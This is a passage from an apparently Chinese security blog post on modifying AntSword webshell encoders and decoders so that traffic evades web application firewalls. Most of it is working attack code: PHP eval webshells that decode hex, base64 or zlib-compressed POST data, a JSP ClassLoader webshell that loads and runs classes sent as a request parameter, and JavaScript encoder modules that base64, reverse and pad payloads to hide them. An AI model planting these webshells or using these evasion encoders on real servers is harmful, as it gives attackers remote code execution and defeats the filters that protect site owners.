class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  ext.opts.httpConf.headers[<span class="string">&#x27;User-Agent&#x27;</span>]=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`ceshi`</span>;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  data[pwd] = zlib.deflateRawSync(<span class="string">`@eval(@gzinflate(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>])));`</span>).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); ?&gt;</span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex  webshell</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_POST <span class="keyword">as</span> $k =&gt; $v</span>)</span>&#123;$_POST[$k]=pack(<span class="string">&quot;H*&quot;</span>, $v);&#125;</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;ant&#x27;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line">编码</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::hex编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2021/09/24 16:32:26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">    &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> ret = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> _ <span class="keyword">in</span> data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_ === <span class="string">&#x27;_&#x27;</span>) &#123; <span class="keyword">continue</span> &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解码</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/05/22 10:21:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">       $a = base64_encode($out);</span></span><br><span class="line"><span class="string">        return &#x27;&#123;&quot;message&quot;:&quot;&#x27; .strrev($a) . &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">遗留问题  传参编码绕流量</span><br><span class="line">let ret = &#123;&#125;;</span><br><span class="line">  for (let _ in data)&#123;</span><br><span class="line">    if (_ === &#x27;_&#x27;) &#123; continue &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(&#x27;base64&#x27;);</span><br><span class="line">    </span><br><span class="line">    ret[_] = &#x27;lwk02nm&#x27; + ret[_];</span><br><span class="line">    ret[_] += &#x27;lwk02nm&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  ret[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  ret[pwd] = &#x27;lwk02nm&#x27; + ret[pwd];</span><br><span class="line">  ret[pwd] += &#x27;lwk02nm&#x27;;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`;</span><br><span class="line">  data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  data[pwd] = Buffer.from(`eval(base64_decode($_POST[$&#123;randomID&#125;]));`).toString(&#x27;base64&#x27;);</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  return data;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  /**</span><br><span class="line"> * php::zlib_deflated_raw 编码器</span><br><span class="line"> * Create at: 2019/01/12 00:05:44</span><br><span class="line"> * zlib 压缩 payload, 适配 shell 见代码处</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">var zlib = require(&#x27;zlib&#x27;);</span><br><span class="line">/*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  ext.opts.httpConf.headers[&#x27;User-Agent&#x27;]=&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;;</span><br><span class="line">  // ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  let ret = &#123;&#125;;</span><br><span class="line">  for (let _ in data)&#123;</span><br><span class="line">    if (_ === &#x27;_&#x27;) &#123; continue &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(&#x27;base64&#x27;);</span><br><span class="line">    ret[_] = &#x27;lwk02nm33&#x27; + ret[_];</span><br><span class="line">    ret[_] += &#x27;lwk02nm33&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  let randomID = `ceshi`;</span><br><span class="line">  ret[randomID] = zlib.deflateRawSync(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  ret[randomID] =&#x27;lwk02nm33&#x27; + ret[randomID];</span><br><span class="line">  ret[randomID] += &#x27;lwk02nm33&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ret[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span><br><span class="line">  ret[pwd] = &#x27;lwk02nm33&#x27; + ret[pwd];</span><br><span class="line">  ret[pwd] += &#x27;lwk02nm33&#x27;;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  // ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$st = $_POST[&#x27;test&#x27;];</span><br><span class="line">$result = substr_replace($st, &quot;&quot;, 0, 9);</span><br><span class="line">@eval(@gzinflate(base64_decode($_POST[&quot;ant&quot;])));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="antsword-JSP改造"><a href="#antsword-JSP改造" class="headerlink" title="antsword-JSP改造"></a>antsword-JSP改造</h4><h5 id="1-1JSP改造前置知识"><a href="#1-1JSP改造前置知识" class="headerlink" title="1.1JSP改造前置知识"></a>1.1JSP改造前置知识</h5><p>理论上来说，编码的方式都是相同的。<br>先来看一下jsp的蚁剑目录结构，和其他无疑</p><p><img src="/images/antsword-bypasswaf/image-20240306143134069.png" alt="image-20240306143134069"></p><p>template是文件操作和命令执行的</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="keyword">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>先来看一下一个jsp蚁剑木马，<code>class U extends ClassLoader &#123; ... &#125;</code> 这是一个自定义的 ClassLoader 子类。有一个base64Decode方法用来解base64的，<br>String cls = request.getParameter(“passwd”);接受http的传参给passwd，不为空则进去，然后进行base64解码，<br>    if (cls != null) {<br>        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>用返回结果。<br>用蚁剑连接一下，<br><img src="/images/antsword-bypasswaf/image-20240306150026121.png" alt="image-20240306150026121"></p><p>可以看到passwd是密码，密码传递了一堆字节码，yv66开头<br><img src="/images/antsword-bypasswaf/image-20240306150205683.png" alt="image-20240306150205683"></p><p><img src="/images/antsword-bypasswaf/image-20240306150238145.png" alt="image-20240306150238145"></p><p>我们可以看到蚁剑的一些功能都是yv66开头的。</p><p><img src="/images/antsword-bypasswaf/image-20240306150352542.png" alt="image-20240306150352542"></p><p>这里反编译可以看到java代码，不详细解释了，不是很会。</p><p>bp包里传递功能的时侯s2e8fc7082b2a3=ajY2QgIi8iO3dob2FtaTtlY2hvIGVhNDEyNDQ3MmM7cHdkO2VjaG8gNGI2MmVh<br>也可以看到随机14位值传递功能<br><img src="/images/antsword-bypasswaf/image-20240306150542869.png" alt="image-20240306150542869"></p><p>去掉前两位，即可看到执行了什么命令。和php中的一样。<br><img src="/images/antsword-bypasswaf/image-20240306150628371.png" alt="image-20240306150628371"></p><p>返回包。</p><h5 id="2-编码器与解码器"><a href="#2-编码器与解码器" class="headerlink" title="2.编码器与解码器"></a>2.编码器与解码器</h5><h6 id="2-1jsp编码器"><a href="#2-1jsp编码器" class="headerlink" title="2.1jsp编码器"></a>2.1jsp编码器</h6><p>我们仿照php进行写一个编码器，<br>假设，某款waf可以识别或者标注了这个yv66开头的payload。<br>我们选择base64给payload加密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jsp::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么其实这样就可以，data数组中的pwd给他base64一下，也就是做个传递吧。<br><img src="/images/antsword-bypasswaf/image-20240306151811872.png" alt="image-20240306151811872"></p><p><img src="/images/antsword-bypasswaf/image-20240306151836182.png" alt="image-20240306151836182"></p><p>那么此时发送的数据包就是base64编码过的，那么我们的webshell就要改动一下</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String decodedCls = <span class="keyword">new</span> String(base64Decode(cls), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(decodedCls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改成先进行一下base64解码然后在进行传参，base64解码。这样就把yv66给隐藏了，</p><p>什么，你说waf能解base64，然后识别了yv66,<br>我们可以逆序一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jsp::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，base64,然后逆序。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">那么相应的木马也要改一下，很简单，在传给passwd后的参数先逆序在base64解码即可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">U</span>(<span class="params">ClassLoader c</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class <span class="function"><span class="title">g</span>(<span class="params">byte[] b</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(<span class="built_in">String</span> str) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="built_in">String</span>.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="built_in">Object</span> decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="built_in">String</span>.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">String</span> reversedCls = <span class="keyword">new</span> StringBuilder(cls).reverse().toString();</span><br><span class="line">        <span class="built_in">String</span> decodedCls = <span class="keyword">new</span> <span class="built_in">String</span>(base64Decode(reversedCls), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> U(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(decodedCls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bp里面的包是这样的，人工审核还是能看出来的。</p><p><img src="/images/antsword-bypasswaf/image-20240306154654061.png" alt="image-20240306154654061"></p><p><img src="/images/antsword-bypasswaf/image-20240306154736621.png" alt="image-20240306154736621"></p><p>这里其实最重要的的还是修改这个功能的传参，还是非常明显的。这里就先不研究了。<br><a href="https://github.com/AntSwordProject/antSword/issues/185">https://github.com/AntSwordProject/antSword/issues/185</a><br><a href="https://darkless.cn/2020/05/19/antsword-bypass-waf/#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%BC%96%E7%A0%81%E5%99%A8">https://darkless.cn/2020/05/19/antsword-bypass-waf/#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%BC%96%E7%A0%81%E5%99%A8</a><br>官方和这位师傅都已经给出了答案。<br>当然官方也给出了jsp编码器的zlib版本<br><a href="https://github.com/AntSwordProject/AwesomeScript/blob/master/jsp/jsp_defineclass_zlib_deflated_script.jsp">https://github.com/AntSwordProject/AwesomeScript/blob/master/jsp/jsp_defineclass_zlib_deflated_script.jsp</a></p><h6 id="2-2jsp解码器"><a href="#2-2jsp解码器" class="headerlink" title="2.2jsp解码器"></a>2.2jsp解码器</h6><p>参考：<a href="https://github.com/AntSwordProject/AntSword-JSP-Template/tree/master">https://github.com/AntSwordProject/AntSword-JSP-Template/tree/master</a><br>蚁剑的官方其实已经给出了jsp几种默认的解码方式,</p><p>逆序</p><p><img src="/images/antsword-bypasswaf/image-20240306171434142.png" alt="image-20240306171434142"></p><p>rot13</p><p><img src="/images/antsword-bypasswaf/image-20240306171500284.png" alt="image-20240306171500284"></p><p>base64<br><img src="/images/antsword-bypasswaf/image-20240306171528630.png" alt="image-20240306171528630"></p><p>但是蚁剑添加jsp的时候显示的是php的解码，我们在源码中可以看到相应代码<br><img src="/images/antsword-bypasswaf/image-20240306171746073.png" alt="image-20240306171746073"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSP::reverse 解码器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   <span class="attr">asoutput</span>: <span class="function">(<span class="params">ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span 